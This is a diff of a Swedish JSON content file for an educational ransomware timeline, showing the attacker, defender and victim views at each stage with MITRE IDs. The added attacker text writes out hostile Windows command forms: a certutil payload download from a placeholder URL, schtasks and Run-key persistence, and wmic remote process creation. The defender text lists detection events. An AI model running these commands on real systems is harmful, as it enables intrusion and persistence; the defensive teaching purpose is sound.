@@ -1150,7 +1150,7 @@
           },
           "defender": {
             "title": "Förhindra initial åtkomst",
-            "description": "Organisationen bör stänga alla onödiga externa åtkomstpunkter – särskilt RDP som aldrig ska vara direkt exponerat mot internet. Regelbunden patchning av alla internetexponerade system täpper till kända sårbarheter. E-postfiltrering med sandboxanalys av bilagor, och MFA på alla fjärråtkomsttjänster, eliminerar de vanligaste intrångsvägarna för ransomware-grupper.",
+            "description": "Försvarare måste säkra varje potentiell ingångspunkt eftersom ransomware-operatörer bara behöver en för att lyckas. RDP ska aldrig vara direkt exponerat mot internet – det ska bara vara tillgängligt via VPN eller en Zero Trust-lösning med MFA. E-postsäkerhetsgateways bör blockera körbara bilagor och skanna dokument för skadliga makron. Alla internetexponerade system, särskilt VPN-apparater och webbservrar, måste patchas snabbt eftersom ransomware-grupper aktivt skannar efter nyligen avslöjade sårbarheter. Regelbunden extern penetrationstestning hjälper till att identifiera förbisedd exponering.",
             "tools_or_indicators": [
               "Stängning av extern RDP",
               "Regelbunden patchhantering",
@@ -1159,6 +1159,7 @@
               "Sårbarhetsskanning"
             ],
             "mitre_techniques": [
+              "T1566.001",
               "T1133",
               "T1190"
             ]
@@ -1182,45 +1183,50 @@
           "order": 2,
           "attacker": {
             "title": "Installation av kommando- och kontrollkanal",
-            "description": "Angriparen installerar nu en bakdörr för pålitlig fjärråtkomst. Cobalt Strike är ett kommersiellt penetrationstestverktyg som ofta missbrukas av ransomware-grupper – det installerar en beacon som regelbundet kontaktar angriparens server, exekverar kommandon och kan ladda ned ytterligare verktyg. Kommunikationen är krypterad och designad för att smälta in i normal webbtrafik, vilket gör den svår att upptäcka.",
+            "description": "Det initiala fotfästet är skört – ett makro körs en gång, en sårbarhet patchas, en session tar slut. Angriparen installerar omedelbart ett persistent C2-implantat som överlever omstarter. Cobalt Strike-beacons är det vanligaste verktyget i enterprise-ransomware-incidenter: beacon:en checkar in via HTTPS med konfigurerbart intervall (typiskt 60 sekunder med jitter), använder offermaskinen egna internetanslutning och smälter in i normal HTTPS-trafik. Beacon-trafik krypteras med ett operatörsspecifikt nyckelpar och mallbara C2-profiler som gör att trafiken ser ut som legitima tjänster – konfigurerad att se ut som Microsoft eller Amazon CDN-trafik. Angriparen etablerar också persistens: en schemalagd uppgift (schtasks /create) eller en HKCU Run-registernyckel är vanligast – specifikt för att dessa inte kräver adminrättigheter att skapa. LOLBin-teknik: certutil -urlcache -split -f [URL] laddar ner andra stegets payload med ett betrodd Windows-binärt utan att trigga antiviruslarm.",
             "tools_or_indicators": [
-              "Cobalt Strike Beacon",
-              "Sliver C2",
-              "SystemBC",
-              "PowerShell-nedladdare",
-              "Schemalagda uppgifter för persistens"
+              "Cobalt Strike beacon – HTTPS C2 med mallbara profiler som imiterar legitim trafik; standard check-in 60s med slumpmässig jitter",
+              "Sliver – öppen källkod C2 med mTLS/WireGuard-transport; genererar unika implantat per driftsättning",
+              "Brute Ratel C4 – konstruerat för att undvika EDR-krokar via odokumenterade systemanrop",
+              "certutil -urlcache -split -f [URL] – LOLBin-teknik för att ladda ner payload med betrodd Windows-binär",
+              "Persistens: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run eller schtasks /create /sc onlogon – inga adminrättigheter krävs"
             ],
             "mitre_techniques": [
-              "T1059.001",
               "T1071.001",
+              "T1573",
+              "T1059.001",
               "T1053.005",
-              "T1105"
+              "T1547.001"
             ]
           },
           "defender": {
             "title": "Detektera och blockera C2-kommunikation",
-            "description": "EDR-lösningar på alla endpoints kan upptäcka installation av kända C2-ramverk och misstänkta processer. Nätverksbaserad detektion genom att analysera DNS-förfrågningar och HTTP-trafik efter kända C2-mönster kompletterar endpointskyddet. Blockering av utgående trafik till okategoriserade domäner och nyregistrerade domäner försvårar angriparens kommunikation med sin infrastruktur.",
+            "description": "Detta är det viktigaste detektionsfönstret i hela ransomware-tidslinjen. Genomsnittlig dvälotid mellan C2-etablering och kryptering är 5 dagar (Mandiant M-Trends). Det är fem dagar att fånga angriparen innan den katastrofala fasen börjar. Beaconing har en distinkt nätverkssignatur: konsekventa, periodiska utgående HTTPS-anslutningar till samma destination med ungefär konstant nyttolastsstorlek och intervall. NDR-verktyg som Darktrace eller ExtraHop modellerar baslinjebeteende och flaggar avvikelser – en Windows-arbetsstation som plötsligt börjar göra HTTPS-anslutningar till en VPS-leverantör var 60:e sekund har ingen legitim förklaring. På endpoint: EDR-regler bör larma på Office-applikationer som skapar cmd.exe, wscript.exe eller powershell.exe (förälder-barn-processkedja); och på certutil med -urlcache eller -decode-flaggor. DNS: larm på nyregistrerade domäner (under 30 dagar gamla) som tar emot den allra första frågan från ditt nätverk – Cobalt Strike-operatörer registrerar ofta infrastruktur dagen innan en kampanj.",
             "tools_or_indicators": [
-              "EDR med C2-detektion",
-              "DNS-filtering",
-              "Nätverksflödesanalys",
-              "JA3/JA3S-fingerprinting"
+              "NDR (Darktrace, ExtraHop, Vectra) – beacon-detektion via periodiska utgående anslutningsmönster",
+              "EDR förälder-barn-processlarm: WINWORD.EXE → cmd.exe → powershell.exe är nästan aldrig legitimt",
+              "DNS: larm på frågor till domäner registrerade inom 30 dagar",
+              "Proxy/brandvägg: flagga utgående HTTPS till VPS-leverantörer (DigitalOcean, Vultr, Linode ASN) från endpoint utan historik",
+              "Sysmon Event ID 1 (processkapning) + Event ID 3 (nätverksanslutning): korrelera Office-app som skapar process med utgående anslutning"
             ],
             "mitre_techniques": [
               "T1071.001",
-              "T1059.001"
+              "T1573",
+              "T1059.001",
+              "T1053.005"
             ]
           },
           "victim": {
             "title": "En bakdörr har installerats",
-            "description": "Den komprometterade datorn har nu en aktiv bakdörr som ger angriparen fjärrstyrning. Datorn fungerar normalt för användaren – prestanda och funktionalitet påverkas inte märkbart. Beacon-kommunikationen sker i bakgrunden, ofta med långa intervall (exempelvis var tionde minut), för att minimera risken att upptäckas.",
+            "description": "En av organisationens maskiner checkar nu tyst in med angriparens infrastruktur var 60:e sekund. Användarens skärm visar ingenting ovanligt. Maskinen fungerar normalt. Beacon-processen heter något oskyldigt – svchost32.exe, AdobeUpdater.exe eller ett legitimt klingande tjänstenamn. Om inte säkerhetsteamet har NDR eller EDR konfigurerat för att detektera beaconing-mönster passerar denna fas helt obemärkt. Organisationer med mogna säkerhetsprogram detekterar Cobalt Strike C2 på timmar. Organisationer utan nätverksövervakning upptäcker angriparen efter att lösenanteckningen dykt upp – typiskt 5-30 dagar senare.",
             "tools_or_indicators": [
               "Ovanliga utgående nätverksanslutningar",
               "Nya schemalagda uppgifter",
               "Okända processer i bakgrunden"
             ],
             "mitre_techniques": [
-              "T1071.001"
+              "T1071.001",
+              "T1053.005"
             ]
           }
         },
@@ -1256,12 +1262,12 @@
             "mitre_techniques": [
               "T1003.001",
               "T1068",
-              "T1134"
+              "T1558.003"
             ]
           },
           "victim": {
             "title": "Administratörskonton komprometteras",
-            "description": "Lösenord extraheras ur minnet utan att kontot låses eller lösenordet ändras. Med token impersonation behöver angriparen inte ens lösenordet – de kör kommandon direkt i den privilegierade användarens säkerhetskontext utan att lämna spår i normala lösenordsloggar.",
+            "description": "Organisationens mest kraftfulla inloggningsuppgifter skördas nu av angriparen. Domänadministratörskonton, tjänstekonton med bred åtkomst och säkerhetskopieringsoperatörskonton är alla mål. Varje inloggningsuppgift angriparen fångar utvidgar deras kontroll över nätverket. IT-administratörer som loggat in på den initialt komprometterade maskinen kan ha lämnat cachade uppgifter som angriparen nu kan extrahera. Organisationens Active Directory, som kontrollerar åtkomst till allt, komprometteras systematiskt inifrån.",
             "tools_or_indicators": [
               "Stulna domänadministratörsuppgifter",
               "Extraherade lösenordshashar",
@@ -1269,7 +1275,7 @@
             ],
             "mitre_techniques": [
               "T1003.001",
-              "T1134"
+              "T1558.003"
             ]
           }
         },
@@ -1278,24 +1284,24 @@
           "order": 4,
           "attacker": {
             "title": "Kartläggning av hela nätverkets struktur",
-            "description": "Med administratörsbehörigheter kartlägger angriparen hela den interna nätverksstrukturen. BloodHound är ett specialverktyg som analyserar Active Directory-relationer och grafiskt visar den kortaste vägen till domänadministratör. AdFind och PowerView samlar in detaljerad information om domäncontrollers, servrar, arbetsstation och användarkonton. Angriparen letar specifikt efter filservrar, säkerhetskopieringsservrar och kritiska affärssystem.",
+            "description": "Med förhöjda privilegier genomför angriparen noggrann spaning av det interna nätverket för att förstå dess struktur, identifiera högt värderade mål och planera krypteringsstrategin. Active Directory frågas med verktyg som BloodHound, som kartlägger förtroendeförhållanden och attackvägar för att identifiera den kortaste vägen till domänadmin. Nätverksskanning med verktyg som Advanced IP Scanner avslöjar alla anslutna system, filservrar, säkerhetskopieringsservrar och databasservrar. Angriparen letar specifikt efter säkerhetskopieringsinfrastruktur – att förstöra säkerhetskopior innan krypteringen säkerställer att offret inte kan återhämta sig utan att betala lösen.",
             "tools_or_indicators": [
-              "BloodHound",
-              "AdFind",
-              "PowerView",
-              "Intern Nmap-skanning",
-              "Net-kommandon"
+              "BloodHound – kartlägger Active Directory-relationer och identifierar attackvägar till högt värderade mål",
+              "Advanced IP Scanner och Nmap för att upptäcka alla nätverksanslutna system",
+              "PowerView – PowerShell-verktyg för att fråga Active Directory-objekt, behörigheter och gruppmedlemskap",
+              "Net-kommandon (net view, net group) för att räkna upp delade mappar och domängrupper",
+              "Identifiering av säkerhetskopieringsservrar, NAS-enheter och molnsäkerhetskopieringslösningar för senare förstörelse"
             ],
             "mitre_techniques": [
               "T1018",
               "T1069",
-              "T1087.002",
-              "T1482"
+              "T1082",
+              "T1016"
             ]
           },
           "defender": {
             "title": "Detektera intern spaning",
-            "description": "Ovanliga LDAP-frågor mot Active Directory, breda portskannor från arbetsplatsdatorer och användning av nätverksspanningsverktyg ska generera larm. Honeypots – falska servrar och konton som legitima användare aldrig kontaktar – kan avslöja angripare som utforskar nätverket. Nätverkssegmentering begränsar vilka delar av nätverket som är synliga från varje segment.",
+            "description": "Intern nätverksskanning och Active Directory-uppräkning genererar distinkta mönster som säkerhetsövervakning bör detektera. Ovanliga LDAP-frågor – särskilt de som begär information om alla datorer, alla användare eller alla gruppmedlemskap – är en stark indikator på angriparspaning. Honeypots, falska system på nätverket som inga legitima användare borde komma åt, ger högt tillitslarm när en angripares skanning rör vid dem. Övervakning av BloodHounds karakteristiska SharpHound-datainsamling och stora LDAP-frågor hjälper till att fånga denna fas innan angriparen slutfört sin nätverkskarta.",
             "tools_or_indicators": [
               "SIEM-larm för ovanliga LDAP-frågor",
               "Honeypots och honungskonton",
@@ -1304,12 +1310,13 @@
             ],
             "mitre_techniques": [
               "T1018",
-              "T1087.002"
+              "T1069",
+              "T1082"
             ]
           },
           "victim": {
             "title": "Hela nätverket är kartlagt",
-            "description": "Angriparen har nu en fullständig bild av organisationens IT-infrastruktur – vilka servrar som finns, vad de används till, var säkerhetskopiorna lagras och vilka vägar som leder till de mest värdefulla systemen. Denna kunskap gör den kommande attacken betydligt mer effektiv och förödande. Användarna i nätverket märker ingenting av denna fas.",
+            "description": "Angriparen har nu en komplett karta över organisationens nätverk: varje server, varje arbetsstation, varje filresurs, varje databas och kritiskt – varje säkerhetskopieringssystem. De vet vilka system som innehåller mest värdefull data, vilka konton som har störst åtkomst och var organisationens återhämtningskapacitet finns. Denna nivå av intern kunskap – som ofta konkurrerar med vad IT-avdelningen själv vet – är det som gör den kommande krypteringen så förödande.",
             "tools_or_indicators": [
               "Kartlagd nätverksstruktur",
               "Identifierade säkerhetskopieringsservrar",
@@ -1317,7 +1324,7 @@
             ],
             "mitre_techniques": [
               "T1018",
-              "T1482"
+              "T1082"
             ]
           }
         },
@@ -1326,7 +1333,7 @@
           "order": 5,
           "attacker": {
             "title": "Spridning genom nätverket",
-            "description": "Angriparen rör sig nu från system till system med de stulna administratörsuppgifterna. PsExec och WMI (Windows Management Instrumentation) används för att fjärrexekvera kommandon och installera bakdörrar på servrar. RDP med stulna uppgifter ger full grafisk åtkomst. Målet är att nå alla kritiska system – särskilt domäncontrollers, filservrar och säkerhetskopieringsservrar – innan krypteringen startar.",
+            "description": "Med domänadminuppgifter i hand sprider sig angriparen till varje system som spelar roll innan krypteringen triggas. Denna sekvens är avsiktlig: filservrar (för exfiltrering), säkerhetskopieringsservrar (för att förstöra återhämtningsalternativ), domäncontrollers (för att driftsätta krypteringen). PsExec är det vanligaste verktyget – det kopierar ett tjänstbinär till målets ADMIN$-resurs, registrerar det som en tjänst, kör kommandot och tar bort sig självt. WMI är mer smygande: wmic /node:MÅL process call create 'cmd.exe /c [kommando]' kör en process på distans utan fil på disk. Angriparen RDP:ar också direkt till domäncontrollers och säkerhetskopieringsservrar för manuellt arbete – och detta är en enorm detektionsmöjlighet. En RDP-inloggning till en domäncontroller från en vanlig arbetsstation som aldrig gjort det tidigare är en av de mest tillförlitliga kompromissindikatorerna i Windows-miljöer. Det ska trigga ett omedelbart larm, inte begravas i en logg.",
             "tools_or_indicators": [
               "PsExec",
               "WMI-fjärrexekvering",
@@ -1337,23 +1344,24 @@
             "mitre_techniques": [
               "T1021.002",
               "T1021.001",
-              "T1021.003",
+              "T1021.006",
               "T1047"
             ]
           },
           "defender": {
             "title": "Begränsa lateral förflyttning",
-            "description": "Mikrosegmentering delar upp nätverket i isolerade zoner. Windows Firewall ska blockera SMB (port 445) och RDP (port 3389) mellan arbetsstationer – dessa protokoll behövs sällan lateralt. Kritisk detektionssignal: RDP-inloggning till en domäncontroller från en icke-PAW-enhet är en nästan säker kompromissindikator – en domäncontroller ska aldrig nås via RDP från en vanlig arbetsstation. Windows Event ID 7045 (ny tjänst installerad) triggas av PsExec och är ett högsignalslarm. Blockera port 445 och 135 mellan klientsegment för att omöjliggöra PsExec och WMI-lateral förflyttning.",
+            "description": "Nätverkssegmentering är den strukturella kontrollen som begränsar skadeomfånget: arbetsstationer kan inte nå varandra direkt, kan inte nå domäncontrollers via SMB (port 445) eller WMI. Men anta att segmentering är ofullständig och lägg detektion ovanpå. Windows Event ID 4624 (lyckad inloggning) med Inloggningstyp 3 (nätverk) eller Typ 10 (RDP) från en källmaskin som aldrig åtkomstit målet är en lateral förflyttningsindikator. Event ID 7045 på målmaskinen innebär att PsExec installerade en tjänst – sök efter detta i din miljö vid minsta misstanke om kompromiss. Larm på RDP-anslutningar till domäncontrollers från annan källa än dina dedikerade PAW:ar (Privileged Access Workstations) – detta är ett tierkränkning och en nästan säker kompromissindikator. Aktivera PowerShell ScriptBlock-loggning (Event ID 4104) för att fånga vad som körs på distans. Säkerhetskopieringsservrar bör vara helt isolerade från domänen.",
             "tools_or_indicators": [
-              "Mikrosegmentering",
-              "Windows Firewall-policyer",
-              "Event ID 7045 (ny tjänst = PsExec-indikator)",
-              "RDP till DC från icke-PAW = kompromissindikator",
-              "Blockering av port 445/135 mellan klientsegment"
+              "Windows Event ID 7045 på valfri maskin – ny tjänst installerad; PsExec genererar alltid detta på målet",
+              "Event ID 4624 Inloggningstyp 3/10 från aldrig-sett-tidigare källa-till-mål-par",
+              "Larm vid RDP-session till domäncontroller från icke-PAW-källa – tierkränkning och nästan säker kompromissindikator",
+              "Sysmon Event ID 1: wmic.exe med /node:-argument – WMI-fjärrexekvering",
+              "Nätverksbrandvägg: blockera port 445 (SMB) och 135 (WMI) mellan arbetsstationsubnät"
             ],
             "mitre_techniques": [
               "T1021.002",
-              "T1021.001"
+              "T1021.001",
+              "T1047"
             ]
           },
           "victim": {
@@ -1365,7 +1373,8 @@
               "Installation av verktyg på servrar"
             ],
             "mitre_techniques": [
-              "T1021.002"
+              "T1021.002",
+              "T1021.001"
             ]
           }
         },
@@ -1398,8 +1407,9 @@
               "Proxy med SSL-inspektion"
             ],
             "mitre_techniques": [
-              "T1567.002",
-              "T1048"
+              "T1048",
+              "T1560.001",
+              "T1567.002"
             ]
           },
           "victim": {
@@ -1411,6 +1421,7 @@
               "Åtkomst till fildelningar som sällan används"
             ],
             "mitre_techniques": [
+              "T1048",
               "T1567.002"
             ]
           }
@@ -1432,19 +1443,19 @@
             "mitre_techniques": [
               "T1486",
               "T1490",
-              "T1489",
-              "T1562.001"
+              "T1489"
             ]
           },
           "defender": {
             "title": "Sista linjens försvar och återhämtning",
-            "description": "Isolerade och oföränderliga säkerhetskopior (immutable backups) som inte kan raderas av angriparen är den viktigaste återhämtningsmekanismen – dessa ska vara air-gapped eller write-once. EDR-regler som identifierar masskryptering av filer och automatiskt isolerar maskinen kan stoppa spridningen. Övervaka specifikt: 'wmic shadowcopy delete', 'vssadmin', och 'bcdedit recoveryenabled' – dessa tre kommandon i sekvens är ett nästan säkert tecken på ransomware-körning. En förberedd och övad incidentresponsplan möjliggör snabb koordination av isolering, forensik och återställning.",
+            "description": "När kryptering väl börjar gäller det att agera snabbt. Nätverksisolering bör triggas omedelbart: att koppla bort drabbade segment från nätverket kan hindra ransomware från att nå system det ännu inte krypterat. Förberedda incidentresponsrutiner bör aktiveras: kontakta brottsbekämpande myndigheter, engagera ett specialiserat IR-företag och meddela organisationens cyberförsäkringsbolag. Oföränderliga, offline-säkerhetskopior som angriparen inte kunde nå är den primära återhämtningsmekanismen. Organisationer bör aldrig anta att de måste betala – många ransomware-varianter har kända dekryptorer, och brottsbekämpande operationer återfår ibland dekrypteringsnycklar från beslagtagen infrastruktur.",
             "tools_or_indicators": [
-              "Immutable/air-gapped backups",
-              "EDR med ransomware-detektion",
-              "Sysmon/SIEM-larm för VSS-radering",
-              "Incidentresponsplan",
-              "Nätverksisolering av drabbade segment"
+              "Nätverksisolering för att begränsa krypteringsspridning",
+              "Oföränderliga offline-säkerhetskopior för återhämtning utan betalning",
+              "Incidentresponsberedskap med specialiserat IR-företag",
+              "Anmälan till brottsbekämpande (Polisen, CERT-SE, FBI IC3 om amerikanska intressen berörs)",
+              "No More Ransom-projektet (nomoreransom.org) för gratis dekryptorer",
+              "Aktivering av cyberförsäkring för incidentresponsstöd"
             ],
             "mitre_techniques": [
               "T1486",
@@ -1453,15 +1464,17 @@
           },
           "victim": {
             "title": "Alla filer är krypterade och otillgängliga",
-            "description": "Anställda kan inte öppna sina filer, servrar är nere och en lösenanteckning möter dem på skärmarna. Hela organisationens verksamhet kan stå still. Beslutet om huruvida lösensumman ska betalas är komplext – brottsbekämpande myndigheter avråder generellt. Utan fungerande säkerhetskopior kan betalning verka som enda alternativet, men studier visar att 80 procent av organisationer som betalar attackeras igen – angriparen vet att ni betalar. No More Ransom (nomoreransom.org) erbjuder gratis dekrypteringsverktyg för ett hundratal kända ransomware-varianter. Anmäl alltid till Polisen och till CERT-SE.",
+            "description": "Varje filserver är krypterad. Varje arbetsstation visar lösenanteckningen. Databasen är oläsbar. Verksamheten stannar omedelbart. Lösenanteckningen listar ett belopp – typiskt 500 000 till 5 miljoner dollar för enterprise-mål – och en deadline. Här är där dubbel utpressning ändrar kalkylen helt: även om organisationen har perfekta säkerhetskopior och kan återställa från dem, har angriparen redan exfiltrerat känslig data. Att betala för dekrypteringsnycklar avlägsnar inte det stulna. Att inte betala innebär att angriparen publicerar datan på deras läcksajt. Brottsbekämpande myndigheter avråder konsekvent från betalning, och med goda skäl: ungefär 80 procent av organisationer som betalar attackeras igen inom ett år – angriparen vet att ni betalar. No More Ransom-projektet (nomoreransom.org) ger gratis dekryptorer för ett hundratal kända ransomware-varianter – kontrollera alltid innan betalning. Anmäl alltid till Polisen och CERT-SE.",
             "tools_or_indicators": [
-              "Krypterade filer med ändrad filändelse",
-              "Lösenanteckning på alla drabbade system",
-              "Total verksamhetsavbrott",
-              "Krav på betalning i Bitcoin eller Monero"
+              "Alla filer krypterade med angriparspecifik filändelse; lösenanteckning i varje katalog",
+              "No More Ransom (nomoreransom.org) – kontrollera gratis dekryptorer innan betalning övervägs",
+              "CERT-SE och Polisen – anmäl incidenten omedelbart",
+              "Cyberförsäkring – meddela omedelbart; täckning inkluderar typiskt IR-kostnader, juridik och ibland lösensummeförhandling",
+              "Oföränderliga offline-säkerhetskopior – den enda rena återhämtningsvägen"
             ],
             "mitre_techniques": [
-              "T1486"
+              "T1486",
+              "T1490"
             ]
           }
         }
